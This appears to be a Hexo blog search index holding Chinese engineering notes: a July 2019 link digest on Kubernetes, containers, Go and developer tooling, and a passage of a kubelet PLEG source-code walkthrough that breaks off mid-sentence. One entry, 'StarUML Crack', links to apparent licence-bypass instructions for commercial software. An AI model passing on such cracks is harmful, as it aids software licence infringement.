<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019 年 7 月手记</title>
      <link href="/hexo-blog/20190719/2019-%E5%B9%B4-7-%E6%9C%88%E6%89%8B%E8%AE%B0/"/>
      <url>/hexo-blog/20190719/2019-%E5%B9%B4-7-%E6%9C%88%E6%89%8B%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h2><h3 id="api-conventions"><a href="#api-conventions" class="headerlink" title="api conventions"></a>api conventions</h3><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md</a></p><h3 id="kube-node-lease"><a href="#kube-node-lease" class="headerlink" title="kube node lease"></a>kube node lease</h3><p>kube node lease 用来改善 kubelet 定时更新节点状态对 etcd 造成的压力。</p><p><a href="https://containers.goffinet.org/k8s/kubectlget.html#what-about-kube-node-lease" target="_blank" rel="noopener">https://containers.goffinet.org/k8s/kubectlget.html#what-about-kube-node-lease</a></p><p><a href="https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/0009-node-heartbeat.md" target="_blank" rel="noopener">https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/0009-node-heartbeat.md</a></p><p><a href="https://kubernetes.io/docs/concepts/architecture/nodes/#node-controller" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/architecture/nodes/#node-controller</a></p><p><a href="https://github.com/kubernetes-sigs/kubespray/blob/master/docs/kubernetes-reliability.md" target="_blank" rel="noopener">https://github.com/kubernetes-sigs/kubespray/blob/master/docs/kubernetes-reliability.md</a></p><a id="more"></a><h3 id="Finalizers"><a href="#Finalizers" class="headerlink" title="Finalizers"></a>Finalizers</h3><p><a href="https://book-v1.book.kubebuilder.io/beyond_basics/using_finalizers.html" target="_blank" rel="noopener">https://book-v1.book.kubebuilder.io/beyond_basics/using_finalizers.html</a></p><h3 id="controller-history"><a href="#controller-history" class="headerlink" title="controller history"></a>controller history</h3><p><a href="https://github.com/kubernetes/community/blob/master/contributors/design-proposals/apps/controller_history.md" target="_blank" rel="noopener">ControllerRevision</a> 是为 StatefulSet 和 DaemonSet 保存历史的资源类型。因为设计得比较通用，第三方控制器 + CRD 也可以借助它来实现版本管理。</p><h3 id="client-go-informer"><a href="#client-go-informer" class="headerlink" title="client-go informer"></a>client-go informer</h3><p><a href="https://github.com/kubernetes/sample-controller/blob/master/docs/controller-client-go.md" target="_blank" rel="noopener">https://github.com/kubernetes/sample-controller/blob/master/docs/controller-client-go.md</a></p><h3 id="kubebuilder"><a href="#kubebuilder" class="headerlink" title="kubebuilder"></a>kubebuilder</h3><p><a href="https://github.com/kubernetes-sigs/kubebuilder" target="_blank" rel="noopener">kubebuilder</a> 是开发第三方 controller 或 operator 的代码框架生成工具。它的实现基于 <a href="https://github.com/kubernetes-sigs/controller-runtime" target="_blank" rel="noopener">controller-runtime</a> 这个项目。</p><h3 id="Create-Kubernetes-Cluster"><a href="#Create-Kubernetes-Cluster" class="headerlink" title="Create Kubernetes Cluster"></a>Create Kubernetes Cluster</h3><p>使用 kubeadm 快速搭建一个可用的开发集群：</p><ol><li><p><a href="https://kubernetes.io/docs/setup/production-environment/container-runtimes/" target="_blank" rel="noopener">Install Container Runtimes</a></p></li><li><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">Get Docker CE for Ubuntu</a></p></li><li><p><a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/" target="_blank" rel="noopener">Install kubeadm</a></p></li><li><p><a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/" target="_blank" rel="noopener">Create Cluster</a></p></li><li><p><a href="https://docs.projectcalico.org/v3.8/getting-started/kubernetes/" target="_blank" rel="noopener">Install CNI Plugin</a></p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/v3.8/manifests/calico.yaml</span><br></pre></td></tr></table></figure></li></ol><h3 id="KubeCon-2019-Videos"><a href="#KubeCon-2019-Videos" class="headerlink" title="KubeCon 2019 Videos"></a>KubeCon 2019 Videos</h3><p><a href="https://www.youtube.com/watch?v=5yKheFRMflQ&amp;list=PLj6h78yzYM2Njj5PvNc4Mtcril2YyR95d" target="_blank" rel="noopener">https://www.youtube.com/watch?v=5yKheFRMflQ&amp;list=PLj6h78yzYM2Njj5PvNc4Mtcril2YyR95d</a></p><h3 id="阿里技术"><a href="#阿里技术" class="headerlink" title="阿里技术"></a>阿里技术</h3><h4 id="基于多租户的虚拟集群"><a href="#基于多租户的虚拟集群" class="headerlink" title="基于多租户的虚拟集群"></a>基于多租户的虚拟集群</h4><p><a href="https://drive.google.com/file/d/1DX3jBwueEpSRhJ6n3VcqS1S3GDVvhF1B/view" target="_blank" rel="noopener">https://drive.google.com/file/d/1DX3jBwueEpSRhJ6n3VcqS1S3GDVvhF1B/view</a></p><p><a href="https://docs.google.com/document/d/1EELeVaduYZ65j4AXg9bp3Kyn38GKDU5fAJ5LFcxt2ZU/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1EELeVaduYZ65j4AXg9bp3Kyn38GKDU5fAJ5LFcxt2ZU/edit</a></p><h4 id="容器迁移"><a href="#容器迁移" class="headerlink" title="容器迁移"></a>容器迁移</h4><p><a href="http://blog.itpub.net/31555606/viewspace-2564791/" target="_blank" rel="noopener">“迁移策略+新容器运行时”应对有状态应用的冷热迁移挑战</a></p><h3 id="CRI"><a href="#CRI" class="headerlink" title="CRI"></a>CRI</h3><p><a href="https://medium.com/cri-o/container-runtimes-clarity-342b62172dc3" target="_blank" rel="noopener">Container runtimes: clarity</a></p><p><a href="https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md" target="_blank" rel="noopener">Container Runtime Interface (CRI) CLI</a></p><p><a href="https://github.com/containerd/cri/blob/master/docs/crictl.md" target="_blank" rel="noopener">CRICTL User Guide</a></p><h3 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h3><h4 id="Flex-Volume"><a href="#Flex-Volume" class="headerlink" title="Flex Volume"></a>Flex Volume</h4><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-storage/flexvolume.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-storage/flexvolume.md</a></p><p><a href="https://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/flexvolume-deployment.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/flexvolume-deployment.md</a></p><h4 id="CSI"><a href="#CSI" class="headerlink" title="CSI"></a>CSI</h4><p><a href="https://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/container-storage-interface.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/design-proposals/storage/container-storage-interface.md</a></p><h3 id="Kubernetes-Handbook"><a href="#Kubernetes-Handbook" class="headerlink" title="Kubernetes Handbook"></a>Kubernetes Handbook</h3><p><a href="https://jimmysong.io/kubernetes-handbook/" target="_blank" rel="noopener">https://jimmysong.io/kubernetes-handbook/</a></p><h3 id="Kubernetes-testing"><a href="#Kubernetes-testing" class="headerlink" title="Kubernetes testing"></a>Kubernetes testing</h3><p><a href="https://jimmysong.io/kubernetes-handbook/develop/testing.html" target="_blank" rel="noopener">https://jimmysong.io/kubernetes-handbook/develop/testing.html</a></p><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/testing.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/testing.md</a></p><h4 id="integration-testing"><a href="#integration-testing" class="headerlink" title="integration testing"></a>integration testing</h4><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/integration-tests.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/integration-tests.md</a></p><h4 id="e2e-testing"><a href="#e2e-testing" class="headerlink" title="e2e testing"></a>e2e testing</h4><p><a href="https://kubernetes.io/blog/2019/03/22/kubernetes-end-to-end-testing-for-everyone/" target="_blank" rel="noopener">https://kubernetes.io/blog/2019/03/22/kubernetes-end-to-end-testing-for-everyone/</a></p><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/e2e-tests.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/e2e-tests.md</a></p><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/writing-good-e2e-tests.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/writing-good-e2e-tests.md</a></p><p><a href="https://www.cnblogs.com/jinsdu/p/7465434.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinsdu/p/7465434.html</a></p><p><a href="https://github.com/onsi/ginkgo" target="_blank" rel="noopener">https://github.com/onsi/ginkgo</a></p><p><a href="http://onsi.github.io/ginkgo/" target="_blank" rel="noopener">http://onsi.github.io/ginkgo/</a></p><p><a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/conformance-tests.md" target="_blank" rel="noopener">https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/conformance-tests.md</a></p><h4 id="可以参考的项目"><a href="#可以参考的项目" class="headerlink" title="可以参考的项目"></a>可以参考的项目</h4><ul><li><a href="https://github.com/kubernetes-sigs/sig-storage-local-static-provisioner" target="_blank" rel="noopener">local-static-provisioner</a></li><li><a href="https://github.com/kubernetes/kubernetes" target="_blank" rel="noopener">kubernetes</a></li><li><a href="https://github.com/openkruise/kruise" target="_blank" rel="noopener">kruise</a></li><li><a href="https://github.com/coreos/prometheus-operator" target="_blank" rel="noopener">prometheus-operator</a></li></ul><h3 id="deletion-and-garbage-collection"><a href="#deletion-and-garbage-collection" class="headerlink" title="deletion and garbage collection"></a>deletion and garbage collection</h3><p><a href="https://thenewstack.io/deletion-garbage-collection-kubernetes-objects/" target="_blank" rel="noopener">这篇文章</a> 介绍了 kubernetes 的删除和垃圾回收机制。</p><h3 id="ingress"><a href="#ingress" class="headerlink" title="ingress"></a>ingress</h3><p><a href="https://traefik.io/" target="_blank" rel="noopener">https://traefik.io/</a></p><h3 id="Useful-Commands"><a href="#Useful-Commands" class="headerlink" title="Useful Commands"></a>Useful Commands</h3><h4 id="查看-control-plane-状态"><a href="#查看-control-plane-状态" class="headerlink" title="查看 control-plane 状态"></a>查看 control-plane 状态</h4><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl get componentstatus</span><br><span class="line">kubectl get cs</span><br><span class="line">kubectl cluster-info</span><br></pre></td></tr></table></figure><h2 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h2><h3 id="RunC-简介"><a href="#RunC-简介" class="headerlink" title="RunC 简介"></a>RunC 简介</h3><p><a href="https://www.cnblogs.com/sparkdev/p/9032209.html" target="_blank" rel="noopener">RunC 简介</a></p><h3 id="docker-registry-self-signed-certificates"><a href="#docker-registry-self-signed-certificates" class="headerlink" title="docker registry self-signed certificates"></a>docker registry self-signed certificates</h3><p>自建 docker registry 自签名方法：</p><p><a href="https://docs.docker.com/registry/insecure/" target="_blank" rel="noopener">https://docs.docker.com/registry/insecure/</a></p><h3 id="容器安全性"><a href="#容器安全性" class="headerlink" title="容器安全性"></a>容器安全性</h3><p><a href="https://jtreminio.com/blog/running-docker-containers-as-current-host-user/" target="_blank" rel="noopener">Running Docker Containers as Current Host User</a></p><h3 id="Useful-Commands-1"><a href="#Useful-Commands-1" class="headerlink" title="Useful Commands"></a>Useful Commands</h3><h4 id="debug-container"><a href="#debug-container" class="headerlink" title="debug container"></a>debug container</h4><p>通过以下命令可以很方便的调试容器网络：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nsenter -t &lt;container-pid&gt; -n ip addr</span><br></pre></td></tr></table></figure><h4 id="start-mongodb-locally"><a href="#start-mongodb-locally" class="headerlink" title="start mongodb locally"></a>start mongodb locally</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.2</span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><h3 id="go-modules-vgo"><a href="#go-modules-vgo" class="headerlink" title="go modules (vgo)"></a>go modules (vgo)</h3><p>go modules 已经逐渐取代其他依赖管理工具，很多社区项目都在逐步向 go modules 迁移。</p><ul><li><a href="https://talks.godoc.org/github.com/myitcv/talks/2018-08-15-glug-modules/main.slide#1" target="_blank" rel="noopener">What are Go modules and how do I use them?</a></li><li><a href="https://segmentfault.com/a/1190000016703769" target="_blank" rel="noopener">Go Modules使用教程</a></li><li><a href="https://xuanwo.io/2019/05/27/go-modules/" target="_blank" rel="noopener">Go Modules 内部分享</a></li></ul><h4 id="go-modules-with-kubernetes-的坑"><a href="#go-modules-with-kubernetes-的坑" class="headerlink" title="go modules with kubernetes 的坑"></a>go modules with kubernetes 的坑</h4><p>使用 go modules 导入 <code>k8s.io/kubernetes</code> 主库会有问题，因为主库的 <code>go.mod</code> 文件里 replace 了一大堆依赖，<a href="https://github.com/kubernetes/kubernetes/issues/79384#issuecomment-505725449" target="_blank" rel="noopener">官方给的建议</a> 是在自己的 <code>go.mod</code> 文件里再次 replace 会正确的版本，或者干脆不要依赖主库。</p><h3 id="golang-内存逃逸"><a href="#golang-内存逃逸" class="headerlink" title="golang 内存逃逸"></a>golang 内存逃逸</h3><p><a href="https://www.do1618.com/archives/1328/go-%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Go 内存逃逸详细分析</a></p><h3 id="golang-测试"><a href="#golang-测试" class="headerlink" title="golang 测试"></a>golang 测试</h3><p><a href="https://colobu.com/2016/07/06/dive-into-go-12/" target="_blank" rel="noopener">测试、性能测试以及代码示例的编写</a></p><p>Package <a href="https://golang.org/pkg/cmd/go/internal/test/" target="_blank" rel="noopener">test</a></p><h2 id="Productive"><a href="#Productive" class="headerlink" title="Productive"></a>Productive</h2><h3 id="StarUML-Crack"><a href="#StarUML-Crack" class="headerlink" title="StarUML Crack"></a>StarUML Crack</h3><p><a href="https://gist.github.com/trandaison/40b1d83618ae8e3d2da59df8c395093a#gistcomment-2723165" target="_blank" rel="noopener">https://gist.github.com/trandaison/40b1d83618ae8e3d2da59df8c395093a#gistcomment-2723165</a></p><h3 id="Dictionary-Extension"><a href="#Dictionary-Extension" class="headerlink" title="Dictionary Extension"></a>Dictionary Extension</h3><p>用 DictUnifier（已改名为 <a href="https://github.com/jjgod/mac-dictionary-kit" target="_blank" rel="noopener">mac-dictionary-kit</a>）可以将 <a href="http://download.huzheng.org/zh_CN/" target="_blank" rel="noopener">stardict</a> 词典格式转换为 Apple Dict 格式。</p><p>转换教程参考：</p><ul><li><a href="https://www.douban.com/group/topic/9591106/" target="_blank" rel="noopener">https://www.douban.com/group/topic/9591106/</a></li><li><a href="https://github.com/tsoliangwu0130/my-macos/blob/master/misc/dictunifier-stardict.md" target="_blank" rel="noopener">https://github.com/tsoliangwu0130/my-macos/blob/master/misc/dictunifier-stardict.md</a></li></ul><p><a href="https://github.com/ilius/pyglossary" target="_blank" rel="noopener">PyGlossary</a> 是另外一种词典转换工具，不过需要在 <a href="https://developer.apple.com/download/more/" target="_blank" rel="noopener">Apple Developer Downloads</a> 单独下载 Additional Tools for Xcode.</p><p>词典转换后可能会有 css 显示问题，可以参考：</p><ul><li><a href="https://discussions.apple.com/thread/3736067" target="_blank" rel="noopener">https://discussions.apple.com/thread/3736067</a></li></ul><h3 id="禁用-DS-Store"><a href="#禁用-DS-Store" class="headerlink" title="禁用 .DS_Store"></a>禁用 <code>.DS_Store</code></h3><p>如果在 macOS 的 Finder 里访问网络文件系统（比如 samba），打开目录是会自动在目录下生成 <code>.DS_Store</code> 来存储一些元信息（标签、文件夹颜色、排序等等），这个在其他系统上看起来就非常不顺眼，因此可以通过下面的命令禁用：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.desktopservices DSDontWriteNetworkStores true</span><br></pre></td></tr></table></figure><p>但是这个命令只对网络存储有用，对于本地磁盘还是会生成 <code>.DS_Store</code> 文件，暂时没有方便的办法禁用。</p><h3 id="Jetbrains-back-forward-with-mouse"><a href="#Jetbrains-back-forward-with-mouse" class="headerlink" title="Jetbrains back/forward with mouse"></a>Jetbrains back/forward with mouse</h3><p>有的鼠标有 Button4 和 Button5 可以在浏览代码时很方便地前进和后退，macOS 系统，在 Visual Studio Code 上正常，但在 Jetbrains 系的 IDE 上默认却是跳转到行首和行尾，解决方法是修改 Button4 和 Button5 默认的键盘快捷键。可以参考<a href="https://stackoverflow.com/questions/14360112/intellij-idea-back-forward-with-mouse" target="_blank" rel="noopener">这个方法</a>修改。</p><h3 id="Vagrant-KVM"><a href="#Vagrant-KVM" class="headerlink" title="Vagrant + KVM"></a>Vagrant + KVM</h3><p>KVM 比 VirtualBox 的性能更好，在 Linux 环境下推荐使用：</p><p><a href="https://medium.com/@gauthierleonard/kvm-machines-for-vagrant-on-archlinux-1d8863344cb7" target="_blank" rel="noopener">https://medium.com/@gauthierleonard/kvm-machines-for-vagrant-on-archlinux-1d8863344cb7</a></p><p><a href="https://docs.cumulusnetworks.com/display/VX/Vagrant+and+Libvirt+with+KVM+or+QEMU" target="_blank" rel="noopener">https://docs.cumulusnetworks.com/display/VX/Vagrant+and+Libvirt+with+KVM+or+QEMU</a></p><p><a href="https://gist.github.com/yuanying/924ce2ce61b75ab818b5" target="_blank" rel="noopener">https://gist.github.com/yuanying/924ce2ce61b75ab818b5</a></p><h3 id="Windows-10-Ubuntu-18-04"><a href="#Windows-10-Ubuntu-18-04" class="headerlink" title="Windows 10 + Ubuntu 18.04"></a>Windows 10 + Ubuntu 18.04</h3><p>在 MacOS 上刻录镜像</p><p><a href="https://www.cybrary.it/0p3n/macos-terminal-create-bootable-usb-iso-using-dd/" target="_blank" rel="noopener">https://www.cybrary.it/0p3n/macos-terminal-create-bootable-usb-iso-using-dd/</a></p><p>Ubuntu Installer 无法识别 GPT 分区</p><p><a href="https://arstechnica.com/civis/viewtopic.php?p=36107737&amp;sid=108632491878b9fa937dcbc6d433765f#p36107737" target="_blank" rel="noopener">https://arstechnica.com/civis/viewtopic.php?p=36107737&amp;sid=108632491878b9fa937dcbc6d433765f#p36107737</a></p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/disabling-secure-boot" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/disabling-secure-boot</a></p><p><a href="https://www.technorms.com/45538/disable-enable-secure-boot-asus-motherboard-uefi-bios-utility" target="_blank" rel="noopener">https://www.technorms.com/45538/disable-enable-secure-boot-asus-motherboard-uefi-bios-utility</a></p><p>NVMe 安装 Ubuntu</p><p><a href="https://ubuntuforums.org/showthread.php?t=2390475" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=2390475</a></p><p><a href="https://ubuntu-mate.community/t/cant-see-nvme-m-2-drive-for-fresh-install/18463/3" target="_blank" rel="noopener">https://ubuntu-mate.community/t/cant-see-nvme-m-2-drive-for-fresh-install/18463/3</a></p><h3 id="VSC-Remote"><a href="#VSC-Remote" class="headerlink" title="VSC Remote"></a>VSC Remote</h3><p>使用 <a href="https://code.visualstudio.com/docs/remote/ssh" target="_blank" rel="noopener">VSC Remote</a> 可以方便地在 Windows 或者 macOS 下利用 ssh 进行 Linux 环境远程开发和调试。需要安装 <a href="https://code.visualstudio.com/insiders/" target="_blank" rel="noopener">Visual Studio Code insiders</a> 版本。</p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><h4 id="change-author-of-commits"><a href="#change-author-of-commits" class="headerlink" title="change author of commits"></a>change author of commits</h4><p><a href="https://makandracards.com/makandra/1717-git-change-author-of-a-commit" target="_blank" rel="noopener">https://makandracards.com/makandra/1717-git-change-author-of-a-commit</a></p><h4 id="grep-logs"><a href="#grep-logs" class="headerlink" title="grep logs"></a>grep logs</h4><p>有时候需要确认某个 PR 或者 commit 有没有合入特定版本或者分支，可以用下面的命令：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="hljs-built_in">log</span> &lt;branch-or-tag-name&gt; --since 3.weeks --grep &lt;pattern&gt;</span><br></pre></td></tr></table></figure><h4 id="git-status-显示-UTF-8-字符"><a href="#git-status-显示-UTF-8-字符" class="headerlink" title="git status 显示 UTF-8 字符"></a>git status 显示 UTF-8 字符</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/u012145252/article/details/81775362" target="_blank" rel="noopener">git status 显示中文和解决中文乱码</a></p><h3 id="Bazel"><a href="#Bazel" class="headerlink" title="Bazel"></a>Bazel</h3><p>Bazel 是 Google 的构建工具，CMake 或者 Makefile 的替代品。</p><p><a href="https://medium.com/windmill-engineering/bazel-is-the-worst-build-system-except-for-all-the-others-b369396a9e26" target="_blank" rel="noopener">https://medium.com/windmill-engineering/bazel-is-the-worst-build-system-except-for-all-the-others-b369396a9e26</a></p><h3 id="jq"><a href="#jq" class="headerlink" title="jq"></a>jq</h3><p>json 的命令行解析工具。参考：<a href="https://stedolan.github.io/jq/tutorial/" target="_blank" rel="noopener">https://stedolan.github.io/jq/tutorial/</a></p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p><a href="https://wiki.bash-hackers.org/start" target="_blank" rel="noopener">The Bash Hackers Wiki</a></p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="服务名与端口号映射"><a href="#服务名与端口号映射" class="headerlink" title="服务名与端口号映射"></a>服务名与端口号映射</h3><p><a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml" target="_blank" rel="noopener">https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml</a></p><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p><a href="https://segmentfault.com/a/1190000016901447" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016901447</a></p><p><a href="https://flink.apache.org/" target="_blank" rel="noopener">https://flink.apache.org/</a></p><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>一个学习 css 的网站，支持边学边练：<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/white-space" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/white-space</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Golang </tag>
            
            <tag> Docker </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubelet PLEG 源码解析</title>
      <link href="/hexo-blog/20190604/Kubelet-PLEG-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
      <url>/hexo-blog/20190604/Kubelet-PLEG-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>PLEG (pod lifecycle event generator) 是 kubelet 中一个非常重要的模块，它主要完成以下几个目标：</p><ol><li>从 runtime 中获取 pod 当前状态，产生 pod lifecycle events</li><li>从 runtime 中获取 pod 当前状态，更新 kubelet pod cache</li></ol><p>本文我们通过分析 PLEG 模块的源码，来加深对 Kubernetes 的理解，也可以加速在使用过程对一些疑难问题的排查和处理，同时后期可以对一些问题源码进行优化，来解决一些 Kubernetes 本身的坑。</p><a id="more"></a><h2 id="PLEG-初始化"><a href="#PLEG-初始化" class="headerlink" title="PLEG 初始化"></a>PLEG 初始化</h2><p>PLEG 模块在 kubelet 实例创建时初始化，在 <code>pkg/kubelet/kubelet.go</code> 文件中：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMainKubelet</span><span class="hljs-params">(...)</span> <span class="hljs-params">(*Kubelet, error)</span></span> &#123;</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    klet.pleg = pleg.NewGenericPLEG(klet.containerRuntime, plegChannelCapacity, plegRelistPeriod, klet.podCache, clock.RealClock&#123;&#125;)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们简单看看 <code>NewGenericPLEG</code> 的实现，见 <code>pkg/kubelet/pleg/generic.go</code>：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// NewGenericPLEG instantiates a new GenericPLEG object and return it.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewGenericPLEG</span><span class="hljs-params">(runtime kubecontainer.Runtime, channelCapacity <span class="hljs-keyword">int</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">    relistPeriod time.Duration, cache kubecontainer.Cache, clock clock.Clock)</span> <span class="hljs-title">PodLifecycleEventGenerator</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> &amp;GenericPLEG&#123;</span><br><span class="line">        relistPeriod: relistPeriod,</span><br><span class="line">        runtime:      runtime,</span><br><span class="line">        eventChannel: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *PodLifecycleEvent, channelCapacity),</span><br><span class="line">        podRecords:   <span class="hljs-built_in">make</span>(podRecords),</span><br><span class="line">        cache:        cache,</span><br><span class="line">        clock:        clock,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>NewGenericPLEG</code> 函数有几个重要的参数：</p><ul><li><p><code>runtime</code></p><p>实参为 <code>klet.containerRuntime</code>，负责容器运行时的管理，对 pod 或 container 状态的获取、同步和删除都通过 <code>runtime</code> 来操作。</p></li><li><p><code>channelCapacity</code></p><p>实参为 <code>plegChannelCapacity</code>，是 <code>eventChannel</code> 有缓冲 channel 的大小，默认值 <code>1000</code>，也就是单节点最大支持 1000 个 pod lifecycle event 同时触发。</p></li><li><p><code>relistPeriod</code></p><p>实参为 <code>plegRelistPeriod</code>，是 PLEG 检测的周期，默认值 <code>1s</code>。</p></li><li><p><code>cache</code></p><p>实参为 <code>klet.podCache</code>，保存着所有 pod 状态的缓存，kubelet 通过 container runtime 更新 pod 缓存。</p></li></ul><p><code>plegChannelCapacity</code> 和 <code>plegRelistPeriod</code> 这两个常量的定义在 <code>pkg/kubelet/kubelet.go</code> 文件里：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> (</span><br><span class="line">    plegChannelCapacity = <span class="hljs-number">1000</span></span><br><span class="line"></span><br><span class="line">    plegRelistPeriod = time.Second * <span class="hljs-number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="PLEG-接口定义"><a href="#PLEG-接口定义" class="headerlink" title="PLEG 接口定义"></a>PLEG 接口定义</h2><p><code>NewGenericPLEG</code> 返回的类型 <code>*GenericPLEG</code> 实现了 <code>PodLifecycleEventGenerator</code> 接口，我们暂且忽略 <code>GenericPLEG</code> 结构体的具体实现，先分析一下 <code>PodLifecycleEventGenerator</code> 接口，这个接口在 <code>pkg/kubelet/pleg/pleg.go</code> 文件中定义，包含三个方法：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// PodLifecycleEventGenerator contains functions for generating pod life cycle events.</span></span><br><span class="line"><span class="hljs-keyword">type</span> PodLifecycleEventGenerator <span class="hljs-keyword">interface</span> &#123;</span><br><span class="line">    Start()</span><br><span class="line">    Watch() <span class="hljs-keyword">chan</span> *PodLifecycleEvent</span><br><span class="line">    Healthy() (<span class="hljs-keyword">bool</span>, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>Start</code> 启动 PLEG。</li><li><code>Watch</code> 返回一个 channel，pod lifecycle events 会发送到这个 channel 里，kubelet 通过这个 channel 来获取事件，执行处理动作。</li><li><code>Healty</code> 返回 PLEG 的健康状态。kubelet 通过这个函数判断 PLEG 是否健康。</li></ul><p>我们再看看 pod lifecycle event 的定义，见 